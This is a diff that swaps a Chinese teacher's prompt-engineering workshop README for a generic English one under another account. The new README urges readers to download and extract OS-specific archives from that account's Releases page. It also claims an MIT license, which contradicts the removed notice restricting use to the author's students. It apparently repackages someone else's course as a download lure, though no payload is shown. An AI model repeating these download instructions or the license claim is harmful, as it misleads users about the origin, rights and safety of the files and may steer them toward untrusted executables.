@@ -1,183 +1,71 @@
-<div align="center">
+# 🎓 Prompt-Engineering-Course - Learn Practical Prompt Engineering Skills
 
-# ✨ AI 智慧教學實戰工作坊 ✨
+## 📥 Download Here
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/flofuentes/Prompt-Engineering-Course/releases)
 
-### ~談教學、創評量~
+## 📘 Introduction
+Welcome to the **Prompt-Engineering-Course**. This course provides practical training materials on prompt engineering, a vital skill in today's digital world. Here, you will learn how to create effective prompts and enhance your understanding of artificial intelligence.
 
-[![License](https://img.shields.io/badge/授權-僅限學員使用-red.svg)](LICENSE)
-[![GitHub Pages](https://img.shields.io/badge/GitHub%20Pages-線上觀看-blue?logo=github)](https://chatgpt3a01.github.io/Prompt-Engineering-Course/)
-[![Author](https://img.shields.io/badge/作者-阿亮老師-orange)](https://www.youtube.com/@Liang-yt02)
+## 🚀 Getting Started
+To begin your journey with our course materials, you need to download the latest version from our Releases page. This straightforward process will provide you with all the necessary resources to start learning.
 
-<br>
+## 📂 Download & Install
+1. **Visit the Releases Page**
+   Go to the following link to access the Releases page: [Download Here](https://github.com/flofuentes/Prompt-Engineering-Course/releases).
 
----
+2. **Select the Latest Release**
+   On the Releases page, look for the latest version. The version number will be marked at the top. Click on it to view the full details.
 
-## 🚀 立即進入教學簡報 🚀
+3. **Download the Files**
+   In the latest release, you’ll find various files. Download the files that match your operating system. For most users, you may find a zip file or a folder containing the teaching materials.
 
-<table>
-<tr>
-<td align="center" width="50%">
+4. **Extract the Files**
+   After downloading, you’ll need to extract the contents of the zip file. Right-click on the downloaded file and select 'Extract All'. Choose a location on your computer where you want to save the files.
 
-### 📘 談教學
+5. **Begin Learning**
+   Navigate to the extracted folder. You will find lesson plans, examples, and practical exercises. Open these files to begin your learning.
 
-**提示詞工程與教學應用**
+## 📋 System Requirements
+To ensure the best experience while using our materials, we recommend the following:
 
-文案、圖像、教學備課、互動專案
+- A computer running Windows, macOS, or Linux.
+- At least 4GB of RAM.
+- An internet connection for accessing additional resources.
 
-<br>
+## 🛠️ Features of the Course
+- **Interactive Lessons**: Each lesson guides you through key concepts step-by-step.
+- **Real-world Applications**: Learn how to apply prompt engineering skills in various situations.
+- **Practice Exercises**: Reinforce your knowledge with practical tasks.
+- **Comprehensive Resources**: Access a wealth of information and examples.
 
-[![進入課程](https://img.shields.io/badge/▶%20談教學-1976D2?style=for-the-badge&logo=google-chrome&logoColor=white)](https://chatgpt3a01.github.io/Prompt-Engineering-Course/提示詞工程教學/index.html)
+## ❓ Frequently Asked Questions
 
-</td>
-<td align="center" width="50%">
+### 1. What is Prompt Engineering?
+Prompt engineering involves crafting inputs for AI systems to elicit desired outputs. It’s essential for effective communication with AI and improving results.
 
-### 📗 創評量
+### 2. Do I need prior programming experience?
+No, this course is designed for everyone. Basic computer skills are all you need.
 
-**AI 協作學習單與評量設計**
+### 3. How often will the course materials be updated?
+We will regularly update the course with new materials and techniques to keep you informed of the latest developments in the field.
 
-評量網站、LINE Bot、語音回饋
+### 4. Can I access the materials offline?
+Yes, once downloaded, all files can be accessed offline. 
 
-<br>
+## 📞 Support
+If you encounter any issues or have questions, please feel free to open an issue in this repository. Our community is here to help!
 
-[![進入課程](https://img.shields.io/badge/▶%20創評量-00796B?style=for-the-badge&logo=google-chrome&logoColor=white)](https://chatgpt3a01.github.io/Prompt-Engineering-Course/提示詞工程教學/index2.html)
+## 📚 Additional Resources
+In addition to the course materials, consider exploring these helpful resources:
 
-</td>
-</tr>
-</table>
+- Online articles and blogs about prompt engineering.
+- Tutorials on YouTube for visual learners.
+- Forums and discussion groups to connect with other learners.
 
----
+## 🛠️ Contributing
+If you wish to contribute to this project, we welcome your input. Please check our guidelines in the repository for more information. 
 
-</div>
+## 📄 License
+This project is licensed under the MIT License. Feel free to use and share the materials! 
 
-## 📚 課程內容總覽
-
-<table>
-<tr>
-<th align="center">🔵 談教學</th>
-<th align="center">🟢 創評量</th>
-</tr>
-<tr>
-<td>
-
-| Part | 主題 |
-|:---:|---|
-| 0 | 資料查找與統整 |
-| 1 | 提示詞工程基礎 |
-| 2 | 文案與教案提示詞 |
-| 3 | 圖像生成提示詞 |
-| 4 | 太空與海洋教學備課 |
-| 5 | 星海粒子互動專案 |
-
-</td>
-<td>
-
-| Part | 主題 |
-|:---:|---|
-| 6 | 評量設計基礎 |
-| 7 | Antigravity 評量網站 |
-| 8 | LINE Bot 語音回饋系統 |
-| 9 | AI 評語生成系統 |
-
-</td>
-</tr>
-</table>
-
----
-
-## 🎯 學習成果
-
-<table>
-<tr>
-<td align="center">🧠<br><b>掌握提示詞框架</b></td>
-<td align="center">✍️<br><b>文字內容生成</b></td>
-<td align="center">🎨<br><b>圖像提示詞撰寫</b></td>
-</tr>
-<tr>
-<td align="center">📚<br><b>教學備課效率</b></td>
-<td align="center">💻<br><b>互動專案開發</b></td>
-<td align="center">📦<br><b>建立 Prompt 庫</b></td>
-</tr>
-</table>
-
----
-
-## 🛠️ 技術棧
-
-<div align="center">
-
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)
-![Google Apps Script](https://img.shields.io/badge/Google%20Apps%20Script-4285F4?style=flat-square&logo=google&logoColor=white)
-![LINE](https://img.shields.io/badge/LINE%20Bot-00C300?style=flat-square&logo=line&logoColor=white)
-![OpenAI](https://img.shields.io/badge/OpenAI-412991?style=flat-square&logo=openai&logoColor=white)
-![Gemini](https://img.shields.io/badge/Gemini%20API-8E75B2?style=flat-square&logo=google&logoColor=white)
-
-</div>
-
----
-
-## 👨‍🏫 作者資訊
-
-<div align="center">
-
-<img src="https://img.shields.io/badge/曾慶良-阿亮老師-FF6B6B?style=for-the-badge" alt="Author"/>
-
-**新興科技推廣中心主任 ｜ 教育部學科中心研究教師**
-
-</div>
-
-| 年份 | 榮譽 |
-|:---:|---|
-| 2025 | 🏆 獲 STEAM 跨領域認證教學講師 |
-| 2024 | 🏆 獲教育部人工智慧講師認證 |
-| 2022-2023 | 🥇 指導學生 XR 專案競賽獲特優 |
-| 2022 | 🥇 獲 VR 教材開發教師組特優 |
-| 2019 | 🏅 獲百大資訊人才獎 |
-| 2018-2019 | 🌟 親子天下創新 100 教師 |
-| 2018 | ⭐ 臺北市特殊優良教師 |
-
-<div align="center">
-
-[![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@Liang-yt02)
-[![Facebook](https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white)](https://www.facebook.com/?locale=zh_TW)
-[![3A 社團](https://img.shields.io/badge/3A%20教師社團-4267B2?style=for-the-badge&logo=facebook&logoColor=white)](https://www.facebook.com/groups/2754139931432955?locale=zh_TW)
-
-📧 **Email:** 3a01chatgpt@gmail.com
-
-</div>
-
----
-
-## ⚠️ 授權聲明
-
-<div align="center">
-
-```
-© 2026 阿亮老師 版權所有
-本專案僅供「阿亮老師課程學員」學習使用
-```
-
-</div>
-
-| ⚠️ 禁止事項 |
-|---|
-| ❌ 禁止修改本專案內容 |
-| ❌ 禁止轉傳或散布 |
-| ❌ 禁止商業使用 |
-| ❌ 禁止未經授權之任何形式使用 |
-
-> 如有任何授權需求，請聯繫作者。
-
----
-
-<div align="center">
-
-### 🌟 立即開始學習 🌟
-
-[![開始學習](https://img.shields.io/badge/🚀%20立即進入課程-FF4081?style=for-the-badge)](https://chatgpt3a01.github.io/Prompt-Engineering-Course/)
-
-**AI 智慧教學實戰工作坊~談教學、創評量**
-
-</div>
-
+Thank you for choosing the **Prompt-Engineering-Course**! We hope you find these materials helpful and inspiring for your learning journey.
